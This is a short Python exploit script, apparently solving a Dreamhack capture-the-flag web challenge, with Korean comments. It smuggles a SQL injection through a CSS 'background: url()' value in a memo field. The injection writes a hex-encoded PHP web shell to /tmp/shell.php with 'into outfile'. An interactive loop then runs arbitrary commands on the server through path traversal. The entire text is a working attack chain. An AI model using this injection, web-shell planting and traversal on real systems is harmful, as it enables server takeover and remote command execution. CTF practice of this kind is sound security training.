import requests

url = "http://host2.dreamhack.games:15567/?path=write"

datas = {
    "memoTitle" : "1",
    "memoColor" : "black; background: url(\"./check.php?id=3 union select 0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e  into outfile '/tmp/shell.php'\")",
    "memoContent" : "panda"
}

response = requests.post(url,data=datas)
# 게시글 작성 후 해당 게시글 report.
# 그러면 /tmp/shell.php 파일이 서버에 생성됩니다.

# 웹쉘 실행 코드는 아래


while(1):
    payload = input("[+] Enter the command : ")
    RESULT = requests.get("http://host2.dreamhack.games:15567" + f'/?path=../../../../../../tmp/shell&cmd={payload}').text.split('<div class="body">')
    print(RESULT)
